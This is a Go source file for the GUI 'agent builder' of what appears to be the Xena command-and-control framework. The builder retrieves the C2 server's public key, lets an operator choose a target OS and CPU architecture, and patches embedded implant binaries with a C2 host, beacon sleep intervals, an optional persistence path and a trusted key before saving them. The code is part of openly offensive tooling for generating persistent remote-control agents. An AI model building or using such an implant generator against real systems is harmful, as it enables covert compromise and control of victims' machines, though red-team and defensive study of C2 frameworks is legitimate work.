package builder

import (
	"common/builder/static"
	"common/patch"
	"encoding/hex"
	"errors"
	"strings"
	"ui/core"
	"ui/effects"

	xenaC2 "github.com/zarkones/xena-client"
	cry "github.com/zarkones/xena-crypto"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/layout"
	"fyne.io/fyne/v2/widget"
)

var AgentBuildMap = map[string][]string{
	"linux":   {"amd64", "386", "arm", "arm64"},
	"windows": {"amd64", "386", "arm", "arm64"},
	"darwin":  {"amd64", "arm64"},
	"openbsd": {"386", "amd64", "arm", "arm64"},
	"solaris": {"amd64"},
}

func BuildAgent(w fyne.Window, successCallback func()) fyne.CanvasObject {
	buildOS := ""
	buildArch := ""

	pubKeyPEM, err := xenaC2.GetC2PublicKey()
	if err != nil {
		if errors.Is(err, xenaC2.ErrNilAuthToken) {
			return container.NewScroll(container.NewVBox(
				widget.NewLabel("API key for C2 server is not set or is invalid, go to 'Settings' page and set it."),
			))
		}
		return container.NewScroll(container.NewVBox(
			widget.NewLabel("Failed to Get Public Key of the C2"),
			widget.NewLabel(err.Error()),
		))
	}

	if len(pubKeyPEM) == 0 {
		return container.NewScroll(container.NewVBox(
			widget.NewLabel("Received no key from the C2 server. C2 API key might be invalid, leading to C2 refusing to serve us its public key."),
		))
	}

	if _, err := cry.ImportPubKeyPEM(pubKeyPEM); err != nil {
		return container.NewScroll(container.NewVBox(
			widget.NewLabel("Failed to Validate Public Key of the C2"),
			widget.NewLabel(err.Error()),
		))
	}

	archSelect := widget.NewSelect([]string{"AMD64", "386", "ARM", "ARM64"}, func(value string) {
		buildArch = value
	})

	osSelect := widget.NewSelect([]string{"WINDOWS", "LINUX", "MACOS", "OPENBSD", "SOLARIS"}, func(value string) {
		buildOS = value
		archSelect.Options = AgentBuildMap[strings.ToLower(buildOS)]
		archSelect.Refresh()
	})

	agentType := "MONOLITH"
	// agentTypeSelect := widget.NewSelect([]string{"MONOLITH", "MODULAR"}, func(value string) {
	// 	agentType = value
	// })

	pubsubEnabled := "false"
	pubsubSelect := widget.NewSelect([]string{"ENABLED", "DISABLED"}, func(value string) {
		switch value {
		case "ENABLED":
			pubsubEnabled = "true"
		default:
			pubsubEnabled = "false"
		}
	})

	c2HostInput := widget.NewEntry()
	c2HostInput.SetText("http://127.0.0.1:8080")

	loopMaxSleepInput := widget.NewEntry()
	loopMaxSleepInput.SetText("60")
	loopMinSleepInput := widget.NewEntry()
	loopMinSleepInput.SetText("10")

	persistAtPathInput := widget.NewEntry()
	persistAtPathInput.SetPlaceHolder("Persist At Path (leave emtpy for no persistence)")

	c := container.New(layout.NewVBoxLayout(),
		widget.NewLabel("Operating System"),
		osSelect,
		widget.NewLabel("CPU Architecture"),
		archSelect,
		widget.NewSeparator(),
		// widget.NewLabel("Agent Type (monolith = larger binary size)"),
		// agentTypeSelect,
		widget.NewSeparator(),
		widget.NewLabel("C2 Host"),
		c2HostInput,
		widget.NewLabel("Main Loop Max Sleep In Seconds"),
		loopMaxSleepInput,
		widget.NewLabel("Main Loop Min Sleep In Seconds"),
		loopMinSleepInput,
		widget.NewLabel("Real-Time communication via HTTP?"),
		pubsubSelect,
		widget.NewSeparator(),
		widget.NewLabel("Persistence allows you to specify a file path at which agent would save itself."),
		widget.NewLabel("At your disposal are the following variables:"),
		widget.NewLabel("_USER_HOME_DIR"),
		widget.NewLabel("_HOSTNAME"),
		widget.NewLabel("_TMP_DIR"),
		persistAtPathInput,
		widget.NewSeparator(),

		widget.NewButton("SAVE", func() {
			rawBin, err := getAgentBin(buildOS, buildArch, agentType)
			if err != nil {
				notify("Alert", err.Error())
				return
			}

			fd := dialog.NewFileSave(func(uc fyne.URIWriteCloser, err error) {
				if uc == nil {
					return
				}
				if err != nil {
					notify("Alert", err.Error())
					return
				}
				bin := string(rawBin)
				bin = strings.ReplaceAll(bin, patch.GatewayHost, patch.Patch(c2HostInput.Text, patch.GatewayHost))

				bin = strings.ReplaceAll(bin, patch.MaxLoopWait, patch.Patch(loopMaxSleepInput.Text, patch.MaxLoopWait))
				bin = strings.ReplaceAll(bin, patch.MinLoopWait, patch.Patch(loopMinSleepInput.Text, patch.MinLoopWait))

				bin = strings.ReplaceAll(bin, patch.PersistAtPath, patch.Patch(persistAtPathInput.Text, patch.PersistAtPath))

				bin = strings.ReplaceAll(bin, patch.PubSubFlag, patch.Patch(pubsubEnabled, patch.PubSubFlag))

				bin = strings.ReplaceAll(bin, patch.TrustedPubKey, patch.Patch(hex.EncodeToString(pubKeyPEM), patch.TrustedPubKey))

				if _, err := uc.Write([]byte(bin)); err != nil {
					notify("Alert", err.Error())
					return
				}

				uc.Close()
				successCallback()
				// w.Close()
			}, w)

			fd.Show()
		}),
	)

	return effects.Gradient(c, true, true)
}

func getAgentBin(os, arch, agentType string) ([]byte, error) {
	os = strings.ToLower(os)
	arch = strings.ToLower(arch)
	agentType = strings.ToLower(agentType)

	// if agentType == "modular" {
	// 	if os == "linux" && arch == "amd64" {
	// 		return static.AgentModularLinuxAmd64, nil
	// 	}
	// 	if os == "linux" && arch == "386" {
	// 		return static.AgentModularLinux386, nil
	// 	}
	// 	if os == "linux" && arch == "arm" {
	// 		return static.AgentModularLinuxArm, nil
	// 	}
	// 	if os == "linux" && arch == "arm64" {
	// 		return static.AgentModularLinuxArm64, nil
	// 	}

	// 	if os == "windows" && arch == "386" {
	// 		return static.AgentModularWindows386, nil
	// 	}
	// 	if os == "windows" && arch == "amd64" {
	// 		return static.AgentModularWindowsAmd64, nil
	// 	}
	// 	if os == "windows" && arch == "arm" {
	// 		return static.AgentModularWindowsArm, nil
	// 	}
	// 	if os == "windows" && arch == "arm64" {
	// 		return static.AgentModularWindowsArm64, nil
	// 	}
	// }

	if os == "linux" && arch == "amd64" {
		return static.AgentLinuxAmd64, nil
	}
	if os == "linux" && arch == "386" {
		return static.AgentLinux386, nil
	}
	if os == "linux" && arch == "arm" {
		return static.AgentLinuxArm, nil
	}
	if os == "linux" && arch == "arm64" {
		return static.AgentLinuxArm64, nil
	}

	if os == "windows" && arch == "386" {
		return static.AgentWindows386, nil
	}
	if os == "windows" && arch == "amd64" {
		return static.AgentWindowsAmd64, nil
	}
	if os == "windows" && arch == "arm" {
		return static.AgentWindowsArm, nil
	}
	if os == "windows" && arch == "arm64" {
		return static.AgentWindowsArm64, nil
	}

	if os == "darwin" && arch == "amd64" {
		return static.AgentDarwinAmd64, nil
	}
	if os == "darwin" && arch == "arm64" {
		return static.AgentDarwinArm64, nil
	}

	if os == "openbsd" && arch == "amd64" {
		return static.AgentOpenBsdAmd64, nil
	}
	if os == "openbsd" && arch == "386" {
		return static.AgentOpenBsd386, nil
	}
	if os == "openbsd" && arch == "arm" {
		return static.AgentOpenBsdArm, nil
	}
	if os == "openbsd" && arch == "arm64" {
		return static.AgentOpenBsdArm64, nil
	}

	if os == "solaris" && arch == "amd64" {
		return static.AgentSolarisAmd64, nil
	}

	return nil, errors.New("unsupported os and arch")
}

const notifyWindowWidth = 160
const notifyWindowHeight = 80

func notify(title, msg string) {
	w := core.App.NewWindow(title)
	w.Resize(fyne.NewSize(notifyWindowWidth, notifyWindowHeight))
	w.SetContent(container.New(layout.NewHBoxLayout(), widget.NewLabel(msg)))
	w.CenterOnScreen()
	w.Show()
}
